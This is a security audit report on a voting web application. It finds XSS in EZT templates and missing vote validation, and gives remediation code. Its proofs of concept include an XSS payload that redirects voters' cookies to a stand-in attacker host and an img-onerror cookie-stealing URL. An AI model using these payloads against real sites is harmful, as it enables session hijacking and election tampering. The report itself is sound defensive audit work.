### Audit Scope

The application **does not use XPath** in any component, so XPath injection is not applicable. However, per domain context, a broader injection prevention audit was conducted covering SQL, LDAP, template encoding, and data validation. SQL queries are consistently parameterized (positive), and LDAP uses hardcoded filters (positive). Three findings were identified related to output encoding in EZT templates and missing input validation.

## Findings

### High Severity

#### ASVS-127-HIGH-001: Unescaped Server Data in JavaScript Context on Voting Page (Type B Gap)

**Severity:** HIGH  
**File:** `v3/server/templates/vote-on.ezt`  
**Location:** Within `<script>` block, STV_CANDIDATES object initialization  
**Gap Type:** Type B — Control EXISTS (`[format "js,html"]`) in management templates but NOT CALLED in the voter-facing template

**Related Functions Checked:**
- `pages.py:vote_on_page()` — renders vote-on.ezt
- `election.py:get_issue()` — retrieves issue data
- `manage.ezt`, `manage-stv.ezt` — comparison templates with proper escaping

**Description:**

The voting page template (`vote-on.ezt`) embeds server-supplied issue titles and candidate names directly into JavaScript object literals without applying the `[format "js,html"]` escaping directive. This is a Type B gap because the same codebase correctly applies `[format "js,html"]` in management templates (`manage.ezt` and `manage-stv.ezt`), demonstrating developer awareness of the control, but the control was not applied to the most critical template: the voter-facing ballot page.

**Vulnerable Code:**

```javascript
// vote-on.ezt - STV_CANDIDATES JavaScript object
const STV_CANDIDATES = {
[for issues][is issues.vtype "stv"]    "[issues.iid]": {
      seats: [issues.seats],
      title: "[issues.title]",                                    // ← NO escaping
      candidates: [
[for issues.candidates]        { label: "[issues.candidates.label]", name: "[issues.candidates.name]" },  // ← NO escaping
[end]      ]
    },
[end][end]  };
```

**Contrast with control that EXISTS in manage.ezt and manage-stv.ezt:**

```html
<!-- manage.ezt / manage-stv.ezt - PROPERLY escaped -->
onclick="openEditIssueModal('[issues.iid]',
                            '[format "js,html"][issues.title][end]',
                            '[format "js,html"][issues.description][end]')"
```

**Data Flow:**

1. **Source:** Admin sets issue title/candidate names via `POST /do-add-issue/<eid>` or `POST /do-edit-issue/<eid>/<iid>` (form input → `election.add_issue()` → stored in DB)
2. **Sink:** `vote-on.ezt` template renders these values directly into a JavaScript object literal without `[format "js,html"]` escaping
3. **Missing Control:** `[format "js,html"]` directive used in management templates but absent in vote-on.ezt

**Proof of Concept:**

An election administrator creates an STV issue with title:
```
";document.location="https://evil.com/?c="+document.cookie;//
```

Or a candidate name set to the same. When any voter loads `/vote-on/<eid>`, the generated JavaScript becomes:

```javascript
title: "";document.location="https://evil.com/?c="+document.cookie;//",
```

This executes arbitrary JavaScript in every voter's browser.

**Impact:**

- **Session hijacking** for all voters viewing the ballot
- **Silent vote manipulation** (JavaScript can modify form values before submission)
- **Complete compromise of election integrity** on the most security-critical page
- **False confidence:** developers applied `[format "js,html"]` in management templates, suggesting awareness of the risk, but missed the voting template

**Remediation:**

Apply `[format "js"]` to all server-supplied values in JavaScript contexts in `vote-on.ezt`:

```javascript
const STV_CANDIDATES = {
[for issues][is issues.vtype "stv"]    "[format "js"][issues.iid][end]": {
      seats: [issues.seats],
      title: "[format "js"][issues.title][end]",
      candidates: [
[for issues.candidates]        { label: "[format "js"][issues.candidates.label][end]", name: "[format "js"][issues.candidates.name][end]" },
[end]      ]
    },
[end][end]  };
```

Also apply escaping to the `active_tab` value in `voter.ezt`:

```javascript
var active = "[format "js"][active_tab][end]";
```

### Medium Severity

#### ASVS-127-MED-001: Reflected XSS via Unescaped URL Parameters in Error Templates

**Severity:** MEDIUM  
**Files:**
- `v3/server/templates/e_bad_eid.ezt` (line 8)
- `v3/server/templates/e_bad_iid.ezt` (line 8)
- `v3/server/pages.py`, `load_election` (line ~133), `load_election_issue` (lines ~157, ~170)

**Related Functions Checked:**
- `pages.py:load_election()` — decorator that catches ElectionNotFound
- `pages.py:load_election_issue()` — decorator that catches IssueNotFound
- `pages.py:raise_404()` — renders error templates
- All routes using these decorators (7 routes total)

**Description:**

Error templates for invalid election IDs and issue IDs render user-controlled URL path parameters directly into HTML without escaping. The EZT template engine does not auto-escape, requiring explicit `[format "html"]` directives. When `ElectionNotFound` or `IssueNotFound` exceptions are raised, the URL-derived identifiers are passed to error templates and rendered as raw HTML, creating reflected XSS vulnerabilities.

**Vulnerable Code:**

`pages.py` — `load_election` decorator:
```python
async def loader(eid):
    try:
        e = steve.election.Election(DB_FNAME, eid)
    except steve.election.ElectionNotFound:
        result = await basic_info()
        result.title = 'Unknown Election'
        result.eid = eid  # ← URL-derived, user-controlled
        raise_404(T_BAD_EID, result)
```

`e_bad_eid.ezt`:
```html
The Election ID ([eid]) does not exist,   [# ← NO HTML escaping ]
```

`e_bad_iid.ezt`:
```html
The Issue ID ([iid]) does not exist, or you do not   [# ← NO HTML escaping ]
```

**Data Flow:**

1. **Source:** URL path parameter (e.g., `/manage/<eid>` or `/manage-stv/<eid>/<iid>`)
2. **Sink:** EZT template renders `[eid]` or `[iid]` as raw HTML
3. **Missing Control:** No `[format "html"]` applied; EZT does not auto-escape

**Proof of Concept:**

Attacker crafts a URL and sends it to an authenticated committer:
```
https://voting.example.org/manage/%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E
```

Quart URL-decodes the path parameter to `<img src=x onerror=alert(document.cookie)>`. The `ElectionNotFound` exception triggers, and the error template renders:

```html
The Election ID (<img src=x onerror=alert(document.cookie)>) does not exist
```

The `onerror` handler executes JavaScript in the victim's authenticated session.

**Affected Routes (all require authentication):**

| Route | Parameter | Template |
|-------|-----------|----------|
| `GET /manage/<eid>` | eid | e_bad_eid.ezt |
| `GET /vote-on/<eid>` | eid | e_bad_eid.ezt |
| `GET /do-open/<eid>` | eid | e_bad_eid.ezt |
| `GET /do-close/<eid>` | eid | e_bad_eid.ezt |
| `GET /manage-stv/<eid>/<iid>` | eid, iid | e_bad_eid.ezt, e_bad_iid.ezt |
| `POST /do-edit-issue/<eid>/<iid>` | eid, iid | e_bad_eid.ezt, e_bad_iid.ezt |
| `POST /do-delete-issue/<eid>/<iid>` | eid, iid | e_bad_eid.ezt, e_bad_iid.ezt |

**Impact:**

- **Session theft** for authenticated committers/voters via phishing link
- **Potential vote manipulation** or election state changes using stolen session
- **Requires social engineering** (medium severity vs. high) but targets authenticated users with elevated privileges

**Remediation:**

Apply HTML escaping in error templates:

```html
<!-- e_bad_eid.ezt -->
The Election ID ([format "html"][eid][end]) does not exist,
```

```html
<!-- e_bad_iid.ezt -->
The Issue ID ([format "html"][iid][end]) does not exist, or you do not
```

Additionally, validate `eid` and `iid` format (e.g., alphanumeric) early in `load_election`/`load_election_issue` before using them in templates:

```python
import re

async def loader(eid):
    # Validate format before any use
    if not re.match(r'^[a-zA-Z0-9_-]+$', eid):
        result = await basic_info()
        result.title = 'Invalid Election ID'
        result.eid = '[invalid format]'
        raise_404(T_BAD_EID, result)
    
    try:
        e = steve.election.Election(DB_FNAME, eid)
    except steve.election.ElectionNotFound:
        result = await basic_info()
        result.title = 'Unknown Election'
        result.eid = eid  # Now safe - validated format
        raise_404(T_BAD_EID, result)
```

#### ASVS-127-MED-002: Missing Vote String Format Validation (Type B Gap)

**Severity:** MEDIUM  
**File:** `v3/steve/election.py`, `add_vote()` method (lines ~253-268)

**Related Functions Checked:**
- `pages.py:do_vote_endpoint()` — calls add_vote() with form data
- `election.py:tally_issue()` — decrypts and processes votestrings
- `vtypes/*.py` — vote type modules that process votestrings
- `election.py:add_issue()` — validates vote type but not vote format

**Description:**

The `add_vote()` method accepts and stores vote strings without validating their format against the expected structure for the issue's voting type (YNA, STV, etc.). A TODO comment in the code acknowledges this gap. Invalid vote strings are encrypted and stored, potentially causing errors or incorrect results during tallying. This is a Type B gap because vote type validation exists in `add_issue()`, but vote format validation is missing in `add_vote()`.

**Vulnerable Code:**

```python
def add_vote(self, pid: str, iid: str, votestring: str):
    "Add VOTESTRING as the (latest) vote by PID for IID."

    # The Election should be open.
    md = self._all_metadata(self.S_OPEN)

    ### validate VOTESTRING for ISSUE.TYPE voting    # ← TODO: NOT IMPLEMENTED

    mayvote = self.q_get_mayvote.first_row(pid, iid)
    vote_token = crypto.gen_vote_token(md.opened_key, pid, iid, mayvote.salt)

    # Pass MAYVOTE.SALT for PBKDF.
    ciphertext = crypto.create_vote(vote_token, mayvote.salt, votestring)

    self.c_add_vote.perform(vote_token, ciphertext)
```

**Data Flow:**

1. **Source:** `POST /do-vote/<eid>` form data — `value` from `vote-<iid>` form fields (user-controlled)
2. **Through:** `pages.py:do_vote_endpoint()` extracts `votestring` from form → calls `election.add_vote()`
3. **Sink:** `votestring` is encrypted and stored in the `vote` table without format validation
4. **Missing Control:** The TODO comment acknowledges the need for validation but it is not implemented

**`pages.py` caller (lines ~430-445):**

```python
for key, value in form.items():
    if key.startswith('vote-'):
        iid = key.split('-', 1)[1]
        votes[iid] = value        # ← raw form value, no validation

for iid, votestring in votes.items():
    if iid not in issue_dict:     # ← validates IID only
        ...
    election.add_vote(result.uid, iid, votestring)  # ← votestring unchecked
```

**Proof of Concept:**

For a YNA issue (valid values: `y`, `n`, `a`), submit:

```
POST /do-vote/<eid>
Content-Type: application/x-www-form-urlencoded

vote-<valid_iid>=XXXXXXXXX_arbitrary_data_here
```

The arbitrary string is encrypted and stored. During tallying in `tally_issue()`, the decrypted votestring is passed to `vtypes.vtype_module(issue.type).tally()`, which may not handle malformed input gracefully.

**Impact:**

- **Election integrity compromise:** malformed votes could cause tally errors or incorrect results
- **For STV:** invalid candidate labels could disrupt ranking algorithms
- **For YNA:** non-standard values could skew or break vote counting
- **Denial of service on tally** if the vtype module doesn't handle bad input
- **No immediate XSS/injection risk** (encrypted storage) but undermines election trustworthiness

**Remediation:**

Add vote format validation in `add_vote()` or in the calling `do_vote_endpoint()`:

```python
# In election.py, add_vote():
def add_vote(self, pid: str, iid: str, votestring: str):
    md = self._all_metadata(self.S_OPEN)
    
    # Validate votestring format for the issue type
    issue = self.q_get_issue.first_row(iid)
    if not issue:
        raise IssueNotFound(iid)
    
    vtype_mod = vtypes.vtype_module(issue.type)
    if not vtype_mod.validate_vote(votestring, self.json2kv(issue.kv)):
        raise InvalidVoteFormat(iid, issue.type, votestring)
    
    mayvote = self.q_get_mayvote.first_row(pid, iid)
    vote_token = crypto.gen_vote_token(md.opened_key, pid, iid, mayvote.salt)
    ciphertext = crypto.create_vote(vote_token, mayvote.salt, votestring)
    self.c_add_vote.perform(vote_token, ciphertext)
```

Implement `validate_vote()` in each vtype module:

```python
# vtypes/yna.py
def validate_vote(votestring: str, kv: dict) -> bool:
    return votestring in {'y', 'n', 'a'}

# vtypes/stv.py
def validate_vote(votestring: str, kv: dict) -> bool:
    if not votestring:
        return True  # Abstain is valid
    labels = votestring.split(',')
    valid_labels = set(kv.get('labelmap', {}).keys())
    return all(label in valid_labels for label in labels)
```

## Positive Security Patterns

1. **Consistent SQL Parameterization:** Every query in `queries.yaml` uses `?` placeholders. The `asfpy.db` wrapper enforces parameterized execution via `perform()`. No string concatenation or f-string SQL construction was found anywhere in the codebase. This is exemplary defense against SQL injection.

2. **LDAP Hardcoded Filters:** The LDAP search in `asf-load-ldap.py` uses a static filter `'uid=*'` with no user-controlled input. The LDAP DN and attributes are also constants. This eliminates LDAP injection risk.

3. **JavaScript Context Escaping in Management Templates:** `manage.ezt` and `manage-stv.ezt` properly use `[format "js,html"]` when embedding server data in JavaScript event handler attributes, demonstrating awareness of context-specific encoding.

4. **Client-Side HTML Escaping:** The `vote-on.ezt` template includes an `escapeHtml()` utility function used when dynamically inserting candidate names into the DOM via `innerHTML`. This provides defense-in-depth for DOM manipulation.

5. **Database Lookup as Authorization Gate:** `serve_doc()` verifies the user has `mayvote` access to the issue before serving documents, preventing unauthorized file access even without explicit path validation.

6. **Cryptographic ID Generation:** Election IDs and Issue IDs are generated via `crypto.create_id()`, producing unpredictable values that prevent enumeration attacks.

7. **State Machine Enforcement:** The `Election` class enforces state transitions via `assert` statements (`is_editable()`, `is_open()`, `is_closed()`), preventing operations like adding issues to open elections or voting on closed ones.

8. **Centralized Query Definitions:** All SQL is defined in `queries.yaml` and loaded by `asfpy.db`, creating a single point of review for SQL injection. This is an excellent architectural pattern.

## Architecture Observations

1. **No XPath Usage:** The application uses SQLite for persistence, LDAP for directory services, and EZT for templating. No XML processing or XPath queries exist. ASVS 1.2.7 is therefore satisfied by absence of the attack surface.

2. **EZT Template Engine Lacks Auto-Escaping:** Unlike Jinja2's `autoescape` or Django's automatic escaping, EZT requires explicit `[format "html"]` or `[format "js,html"]` directives. This opt-in model creates risk of missing escaping in new templates or template modifications.

3. **No Subprocess Calls:** Neither CLI script (`asf-load-ldap.py`, `create-election.py`) uses `subprocess`, `os.system()`, or similar APIs. Command injection is not possible through the audited code paths.

4. **Separation of Concerns:** Database queries, business logic, and presentation are cleanly separated across `queries.yaml`, `election.py`/`persondb.py`, and EZT templates. This makes security review more tractable.

5. **Cryptographic Vote Storage:** Votes are encrypted before storage, preventing database compromise from revealing voter choices. However, this also means format validation must occur before encryption.

6. **Authentication via External System:** The application delegates authentication to an external OAuth/LDAP system, reducing attack surface for credential handling.

## Recommendations Summary

### Immediate Actions (Deploy within 1 week)

1. **Fix JavaScript escaping in vote-on.ezt (ASVS-127-HIGH-001):** Apply `[format "js"]` to all server-supplied values embedded in JavaScript on the voting page. This is the most critical template in the application and affects all voters.

   ```javascript
   // Priority fix
   title: "[format "js"][issues.title][end]",
   name: "[format "js"][issues.candidates.name][end]"
   ```

2. **Add HTML escaping to error templates (ASVS-127-MED-001):** Apply `[format "html"]` to `[eid]`, `[iid]`, and `[pid]` in error templates.

   ```html
   <!-- Priority fix -->
   The Election ID ([format "html"][eid][end]) does not exist
   ```

### Short-term Actions (Deploy within 1 month)

3. **Implement vote format validation (ASVS-127-MED-002):** Add validation in `add_vote()` to enforce:
   - YNA: value must be one of `{'y', 'n', 'a'}`
   - STV: value must be a comma-separated list of valid candidate labels from the issue's `labelmap`

4. **Validate URL parameters early:** Add format validation for `eid` and `iid` in `load_election`/`load_election_issue` decorators before using them in any context (e.g., regex check for expected ID format from `crypto.create_id()`).

5. **Security test suite:** Create automated tests for:
   - XSS in all template variables (including error pages)
   - Vote format validation for each vote type
   - SQL injection attempts (negative tests)

### Long-term Actions (Plan for next release cycle)

6. **Adopt auto-escaping template engine or enforce EZT escaping policy:** Consider migrating to Jinja2 with `autoescape=True`, or establish a development policy requiring `[format "html"]` on all template variables by default, with explicit opt-out for intentional HTML content.

7. **Content Security Policy:** Implement CSP headers to mitigate XSS impact:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
   ```

8. **Input sanitization layer:** Create a centralized input validation module that all endpoints use for common patterns (IDs, vote strings, issue titles).

9. **Security documentation:** Document the escaping requirements for EZT templates and the validation requirements for vote strings in developer guidelines.
